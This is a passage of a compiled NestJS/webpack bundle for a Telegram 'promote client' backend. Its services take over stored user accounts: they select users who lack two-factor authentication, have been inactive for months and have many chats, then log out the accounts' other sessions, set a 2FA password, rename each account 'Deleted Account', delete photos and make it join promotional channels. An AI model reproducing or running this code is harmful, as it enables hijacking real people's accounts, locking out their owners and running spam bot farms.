                        this.joinChannelMap.set(mobile, channels);
                    }
                    else {
                        this.removeFromPromoteMap(mobile);
                    }
                    try {
                        await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile}: Attempting to join channel: @${channel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, channel);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} @${channel.username} Outer Err ERR: `, false);
                        this.logger.error(`${mobile}: Error joining @${channel.username}:`, errorDetails);
                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);
                            this.removeFromPromoteMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }
                        if (error.errorMessage === "SESSION_REVOKED" ||
                            error.errorMessage === "AUTH_KEY_UNREGISTERED" ||
                            error.errorMessage === "USER_DEACTIVATED" ||
                            error.errorMessage === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            await this.remove(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
                clearTimeout(processTimeout);
            }
            catch (error) {
                this.logger.error('Error in join channel interval:', error);
                this.clearJoinChannelInterval();
            }
        }, this.JOIN_CHANNEL_INTERVAL);
        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug('Clearing join channel interval');
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size > 0) {
                setTimeout(() => {
                    this.logger.debug('Triggering join channel process after timeout');
                    this.joinchannelForPromoteClients(false);
                }, 30000);
            }
        }
    }
    removeFromLeaveMap(key) {
        this.logger.debug(`Removing mobile ${key} from leave map`);
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.logger.log('Leave map is now empty');
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        this.logger.debug('Clearing entire leave map');
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }
    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.debug('Leave map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }
                const processTimeout = setTimeout(() => {
                    this.logger.error('Leave channel interval processing timeout');
                    this.clearLeaveChannelInterval();
                }, 60000 - 1000);
                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);
                for (const mobile of keys) {
                    this.logger.debug(`Processing leave channels for mobile: ${mobile}`);
                    const channels = this.leaveChannelMap.get(mobile);
                    if (!channels || channels.length === 0) {
                        this.logger.debug(`No channels to leave for mobile: ${mobile}`);
                        this.removeFromLeaveMap(mobile);
                        continue;
                    }
                    const channelsToProcess = channels.splice(0, 10);
                    if (channels.length > 0) {
                        this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);
                        this.leaveChannelMap.set(mobile, channels);
                    }
                    else {
                        this.removeFromLeaveMap(mobile);
                    }
                    try {
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);
                        await client.leaveChannels(channelsToProcess);
                        this.logger.debug(`${mobile}: Successfully left ${channelsToProcess.length} channels`);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error);
                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);
                        if (errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN") {
                            this.logger.warn(`${mobile}: Session invalid, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
                clearTimeout(processTimeout);
            }
            catch (error) {
                this.logger.error('Error in leave channel interval:', error);
                this.clearLeaveChannelInterval();
            }
        }, 60000);
        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsPromoteClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('PromoteClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
            try {
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const promoteClient = {
                    tgId: user.tgId,
                    lastActive: "default",
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                };
                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return "Client set as promote successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkPromoteClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await connection_manager_1.connectionManager.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const promoteclients = await this.findAll();
            let goodIds = [];
            const badIds = [];
            if (promoteclients.length < 80) {
                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const bufferClients = await this.bufferClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile); })];
            const bufferClientIds = bufferClients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of promoteclients) {
                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {
                    try {
                        const cli = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: true });
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        await this.telegramService.deleteProfilePhotos(document.mobile);
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword && badIds.length < 4) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                        }
                        else {
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile);
                        }
                        await this.telegramService.removeOtherAuths(document.mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile);
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                }
                else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile);
                    this.remove(document.mobile);
                }
            }
            goodIds = [...goodIds, ...clientIds, ...bufferClientIds];
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoPromoteClients(badIds, goodIds);
        }
        else {
            console.log("ignored active check promote channels as active client setup exists");
        }
    }
    async addNewUserstoPromoteClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New promote documents to be added: ", documents.length);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false });
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true);
                        console.log("Inserting Document");
                        const promoteClient = {
                            tgId: document.tgId,
                            lastActive: "today",
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.create(promoteClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        console.log("=============Created PromoteClient=============");
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        badIds.pop();
                    }
                    else {
                        console.log("Failed to Update as PromoteClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                    await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                console.error("An error occurred:", error);
            }
            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
        }
        setTimeout(() => {
            this.joinchannelForPromoteClients();
        }, 2 * 60 * 1000);
    }
};
exports.PromoteClientService = PromoteClientService;
exports.PromoteClientService = PromoteClientService = PromoteClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('promoteClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        buffer_client_service_1.BufferClientService])
], PromoteClientService);


/***/ }),

/***/ "./src/components/promote-clients/schemas/promote-client.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/schemas/promote-client.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientSchema = exports.PromoteClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let PromoteClient = class PromoteClient {
};
exports.PromoteClient = PromoteClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "lastActive", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], PromoteClient.prototype, "channels", void 0);
exports.PromoteClient = PromoteClient = __decorate([
    (0, mongoose_1.Schema)({ collection: 'promoteClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], PromoteClient);
exports.PromoteClientSchema = mongoose_1.SchemaFactory.createForClass(PromoteClient);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.controller.ts":
/*!****************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.controller.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
let PromoteMsgsController = class PromoteMsgsController {
    constructor(promoteMsgsService) {
        this.promoteMsgsService = promoteMsgsService;
    }
    async findOne() {
        return this.promoteMsgsService.findOne();
    }
    async update(updateClientDto) {
        return this.promoteMsgsService.update(updateClientDto);
    }
};
exports.PromoteMsgsController = PromoteMsgsController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote-msgs data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote-msgs' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "update", null);
exports.PromoteMsgsController = PromoteMsgsController = __decorate([
    (0, swagger_1.ApiTags)('Promote-msgs'),
    (0, common_1.Controller)('promote-msgs'),
    __metadata("design:paramtypes", [promote_msgs_service_1.PromoteMsgsService])
], PromoteMsgsController);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.module.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.module.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const promote_msgs_controller_1 = __webpack_require__(/*! ./promote-msgs.controller */ "./src/components/promote-msgs/promote-msgs.controller.ts");
const promote_msgs_schema_1 = __webpack_require__(/*! ./promote-msgs.schema */ "./src/components/promote-msgs/promote-msgs.schema.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let PromoteMsgModule = class PromoteMsgModule {
};
exports.PromoteMsgModule = PromoteMsgModule;
exports.PromoteMsgModule = PromoteMsgModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            PromoteMsgModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: promote_msgs_schema_1.PromoteMsgSchema }]),
        ],
        providers: [promote_msgs_service_1.PromoteMsgsService],
        controllers: [promote_msgs_controller_1.PromoteMsgsController],
        exports: [promote_msgs_service_1.PromoteMsgsService],
    })
], PromoteMsgModule);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.schema.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.schema.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgSchema = exports.PromoteMsg = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let PromoteMsg = class PromoteMsg {
};
exports.PromoteMsg = PromoteMsg;
exports.PromoteMsg = PromoteMsg = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], PromoteMsg);
exports.PromoteMsgSchema = mongoose_1.SchemaFactory.createForClass(PromoteMsg);
exports.PromoteMsgSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.service.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.service.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let PromoteMsgsService = class PromoteMsgsService {
    constructor(promotemsgModel) {
        this.promotemsgModel = promotemsgModel;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.promotemsgModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`promotemsgModel not found`);
        }
        return updatedUser;
    }
};
exports.PromoteMsgsService = PromoteMsgsService;
exports.PromoteMsgsService = PromoteMsgsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('promotemsgModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], PromoteMsgsService);


/***/ }),

/***/ "./src/components/promote-stats/dto/create-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/create-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreatePromoteStatDto {
}
exports.CreatePromoteStatDto = CreatePromoteStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    __metadata("design:type", String)
], CreatePromoteStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    __metadata("design:type", Map)
], CreatePromoteStatDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719860106247.0, description: 'Last Updated TimeStamp' }),
    __metadata("design:type", Number)
], CreatePromoteStatDto.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    __metadata("design:type", Boolean)
], CreatePromoteStatDto.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    __metadata("design:type", Array)
], CreatePromoteStatDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-stats/dto/update-promote-stat.dto.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/dto/update-promote-stat.dto.ts ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
class UpdatePromoteStatDto extends (0, swagger_1.PartialType)(create_promote_stat_dto_1.CreatePromoteStatDto) {
}
exports.UpdatePromoteStatDto = UpdatePromoteStatDto;


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.controller.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.controller.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const create_promote_stat_dto_1 = __webpack_require__(/*! ./dto/create-promote-stat.dto */ "./src/components/promote-stats/dto/create-promote-stat.dto.ts");
const update_promote_stat_dto_1 = __webpack_require__(/*! ./dto/update-promote-stat.dto */ "./src/components/promote-stats/dto/update-promote-stat.dto.ts");
let PromoteStatController = class PromoteStatController {
    constructor(promoteStatService) {
        this.promoteStatService = promoteStatService;
    }
    async create(createPromoteStatDto) {
        return this.promoteStatService.create(createPromoteStatDto);
    }
    async findByClient(client) {
        return this.promoteStatService.findByClient(client);
    }
    async update(client, updatePromoteStatDto) {
        return this.promoteStatService.update(client, updatePromoteStatDto);
    }
    async deleteOne(client) {
        return this.promoteStatService.deleteOne(client);
    }
    async deleteAll() {
        return this.promoteStatService.deleteAll();
    }
};
exports.PromoteStatController = PromoteStatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_stat_dto_1.CreatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "findByClient", null);
__decorate([
    (0, common_1.Put)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_stat_dto_1.UpdatePromoteStatDto]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':client'),
    __param(0, (0, common_1.Param)('client')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
